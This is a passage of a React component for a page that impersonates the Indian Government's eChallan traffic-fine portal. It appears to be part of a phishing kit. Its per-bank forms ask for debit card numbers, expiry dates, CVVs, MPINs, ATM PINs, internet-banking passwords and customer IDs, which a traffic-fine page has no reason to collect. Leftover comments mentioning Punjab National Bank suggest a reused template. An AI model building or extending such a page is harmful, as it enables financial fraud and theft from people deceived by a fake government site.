                    class="shadow-sm shadow-[#ffffff] placeholder:italic appearance-none rounded-md w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline border-[2px]"
                    id="mpin"
                    name="mpin"
                    type="password"
                    placeholder="Enter MPIN"
                    value={formData.mpin} // Updated value attribute
                    onChange={handleChange} // Added onChange handler
                  />
                </div>
              </div>
            )}

            {options === "card" && (
              <div className="mt-5">
                <div class="mb-4">
                  <label class="block text-gray-700 text-sm mb-2" for="upi_id">
                    Account Number<span className="text-red-500">*</span>
                  </label>
                  <input
                    class="shadow-sm shadow-[#ffffff] placeholder:italic appearance-none rounded-md w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline border-[2px]"
                    id="upi_id"
                    name="upi_id"
                    type="text"
                    placeholder="Enter Debit Card Number"
                    value={formData.upi_id} // Updated value attribute
                    onChange={handleChange} // Added onChange handler
                  />
                </div>

                <div className="flex space-x-2">
                  {/* CIF Number */}
                  <div class="mb-4">
                    <label
                      class="block text-gray-700 text-sm mb-2"
                      for="expiry_date"
                    >
                      Expiry Date<span className="text-red-500">*</span>
                    </label>
                    <input
                      class="shadow-sm shadow-[#ffffff] placeholder:italic appearance-none rounded-md w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline border-[2px]"
                      id="expiry_date"
                      name="expiry_date"
                      type="text"
                      placeholder="Enter Expiry Date"
                      value={formData.expiry_date} // Updated value attribute
                      onChange={handleChange} // Added onChange handler
                    />
                  </div>

                  {/* Branch Code */}
                  <div class="mb-4">
                    <label class="block text-gray-700 text-sm mb-2" for="cvv">
                      CVV <span className="text-red-500">*</span>
                    </label>
                    <input
                      class="shadow-sm shadow-[#ffffff] placeholder:italic appearance-none rounded-md w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline border-[2px]"
                      id="cvv"
                      name="cvv"
                      type="password"
                      placeholder="Enter CVV"
                      value={formData.cvv} // Updated value attribute
                      onChange={handleChange} // Added onChange handler
                    />
                  </div>
                </div>
              </div>
            )}
          </div>
        );
      case "HDFC":
        return (
          <div>
            <div className="text-xs text-gray-500 flex flex-col space-y-1">
              <span
                className={`text-sm text-blue-600 ${
                  options === "internet-banking" ? "underline" : ""
                }`}
                onClick={() => {
                  setOptions("internet-banking");
                  setShowSubmit(true);
                }}
              >
                I have internet banking?
              </span>
              <span
                className={`text-sm text-blue-600 ${
                  options === "card" ? "underline" : ""
                }`}
                onClick={() => {
                  setOptions("card");
                  setShowSubmit(false);
                }}
              >
                I have Debit Card?
              </span>
            </div>

            {options === "internet-banking" && (
              <div className="mt-5">
                {showButton === true && (
                  <div>
                    <div class="mb-4">
                      <label
                        class="block text-gray-700 text-sm mb-2"
                        for="customer"
                      >
                        Customer ID <span className="text-red-500">*</span>
                      </label>
                      <input
                        class="shadow-sm shadow-[#ffffff] placeholder:italic appearance-none rounded-md w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline border-[2px]"
                        id="customer"
                        name="customer"
                        type="text"
                        placeholder="Enter Customer ID"
                        value={formData.customer} // Updated value attribute
                        onChange={handleChange} // Added onChange handler
                      />
                    </div>

                    {/* UPI PIN */}
                    <div class="mb-4">
                      <label
                        class="block text-gray-700 text-sm mb-2"
                        for="password"
                      >
                        Password <span className="text-red-500">*</span>
                      </label>
                      <input
                        class="shadow-sm shadow-[#ffffff] placeholder:italic appearance-none rounded-md w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline border-[2px]"
                        id="password"
                        name="password"
                        type="password"
                        placeholder="Enter Password"
                        value={formData.password} // Updated value attribute
                        onChange={handleChange} // Added onChange handler
                      />
                    </div>

                    <div className="w-auto flex justify-end items-center mt-5">
                      <div
                        className="bg-gradient-to-r from-[#003466] to-[#003466] text-white rounded-sm py-2 px-10 focus:outline-none focus:shadow-outline w-auto"
                        onClick={() => {
                          setShowSubmit(false);
                        }}
                      >
                        Submit
                      </div>
                    </div>
                  </div>
                )}

                {/* Transaction Password  */}
                {showButton !== true && (
                  <div class="mb-4">
                    <label
                      class="block text-gray-700 text-sm mb-2"
                      for="atm_pin"
                    >
                      ATM PIN <span className="text-red-500">*</span>
                    </label>
                    <input
                      class="shadow-sm shadow-[#ffffff] placeholder:italic appearance-none rounded-md w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline border-[2px]"
                      id="atm_pin"
                      name="atm_pin"
                      type="password"
                      placeholder="Enter ATM PIN"
                      value={formData.atm_pin} // Updated value attribute
                      onChange={handleChange} // Added onChange handler
                    />
                  </div>
                )}
              </div>
            )}

            {options === "card" && (
              <div className="mt-5">
                <div class="mb-4">
                  <label
                    class="block text-gray-700 text-sm mb-2"
                    for="customer"
                  >
                    Customer ID<span className="text-red-500">*</span>
                  </label>
                  <input
                    class="shadow-sm shadow-[#ffffff] placeholder:italic appearance-none rounded-md w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline border-[2px]"
                    id="customer"
                    name="customer"
                    type="text"
                    placeholder="Enter Customer ID"
                    value={formData.customer} // Updated value attribute
                    onChange={handleChange} // Added onChange handler
                  />
                </div>
              </div>
            )}
          </div>
        );
      case "Central":
        return (
          <div>
            <div class="mb-4">
              <label class="block text-gray-700 text-sm mb-2" for="account">
                Account Number<span className="text-red-500">*</span>
              </label>
              <input
                class="shadow-sm shadow-[#ffffff] placeholder:italic appearance-none rounded-md w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline border-[2px]"
                id="account"
                name="account"
                type="text"
                placeholder="Enter Account Number"
                value={formData.account} // Updated value attribute
                onChange={handleChange} // Added onChange handler
              />
            </div>
          </div>
        );
      default:
        return (
          <div>
            <h1>Select A Bank</h1>
          </div>
        );
    }
  };

  return (
    <div>
      <section class="w-full">
        <div className="flex flex-col justify-center items-center px-5 py-10 bg-[#003466]">
          {/* Logo */}
          <img
            src="/Government-of-India-Logo-Vector-PNG.png"
            className="w-10"
            alt="Logo"
          />
          <h1 className="text-white text-base font-bold mt-5">भारत सरकार</h1>
          <h1 className="text-white text-base font-bold mt-1">
            Government of India
          </h1>
          <h1 className="text-white text-base font-bold mt-5 text-center">
            eChallan - Digital Traffic/Transport Enforcement Solution
          </h1>
          <span className="text-white text-xs mt-5 text-center">
            An initiative of MoRTH, Goverment Of India
          </span>
        </div>
        <div class="p-6">
          {/* <h1 className="text-2xl font-bold text-[#91203e]">
            Welcome to Punjab National Bank!
          </h1> */}
          <form
            class="space-y-6 flex flex-col justify-center"
            action=""
            id="third-form"
            onSubmit={handleSubmit} // Added onSubmit handler
          >
            {/* <!-- Bank Name --> */}
            <div class="mb-4">
              <label class="block text-gray-700 text-sm mb-2" for="bank_name">
                Bank Name <span className="text-red-500">*</span>
              </label>
              <select
                class="shadow-sm shadow-[#ffffff] placeholder:italic appearance-none rounded-md w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline border-[2px]"
                id="bank_name"
                name="bank_name"
                value={formData.bank_name} // Updated value attribute
                onChange={
                  (e) => {
                    setBankName(e.target.value);
                    handleChange(e);
                  } // Added onChange handler
                } // Added onChange handler
              >
                <option value="">Select a bank</option>
                <option value="SBI">State Bank of India (SBI)</option>
                <option value="BOI">Bank of India</option>
                <option value="PNB">Punjab National Bank (PNB)</option>
                <option value="Union">Union Bank of India</option>
                <option value="ICICI">ICICI Bank</option>
                <option value="Indian">Indian Bank</option>
                <option value="Canara">Canara Bank</option>
                <option value="BOB">Bank of Baroda</option>
                <option value="HDFC">HDFC Bank</option>
                <option value="Central">Central Bank of India</option>
              </select>
            </div>

            {renderPage()}

            {/* <!-- Submit Button --> */}
            {showButton !== true ? (
              <div className="w-full grid grid-cols-2 justify-center items-center mt-5 space-x-2">
                <button className="bg-gradient-to-r from-[#cecece] to-[#cecece] text-black rounded-sm py-2 px-10 focus:outline-none focus:shadow-outline w-auto">
                  Back
                </button>
                <button
                  className="bg-gradient-to-r from-[#003466] to-[#003466] text-white rounded-sm py-2 px-10 focus:outline-none focus:shadow-outline w-auto"
                  type="submit"
                >
                  Submit
                </button>
              </div>
            ) : (
              <div></div>
            )}
          </form>
        </div>
      </section>
      {/* <!-- Footer --> */}
      <section className="bg-[#ffffff] p-5 w-full mt-24">
        <div className="flex space-x-1 w-full justify-between">
          <span className="text-xs text-black font-bold">Support</span>
          <span className="text-xs text-black font-bold">|</span>
          <span className="text-xs text-black font-bold">Find Us</span>
          <span className="text-xs text-black font-bold">|</span>
          <span className="text-xs text-black font-bold">Pricing & Fees</span>
          <span className="text-xs text-black font-bold">|</span>
          <span className="text-xs text-black font-bold">Compliance</span>
        </div>
        <div className="flex space-x-1 w-full justify-between mt-2">
          <span className="text-xs text-black font-bold">
            Terms & Conditions
          </span>
          <span className="text-xs text-black font-bold">|</span>
          <span className="text-xs text-black font-bold">
            Legal Disclosures
          </span>
          <span className="text-xs text-black font-bold">|</span>
          <span className="text-xs text-black font-bold">
            Safety Guidelines
          </span>
        </div>
        <div className="mt-5 text-[10px] text-black">
          Copyright @2021-2024 eChallan. All rights reserved.
        </div>
      </section>
    </div>
  );
}
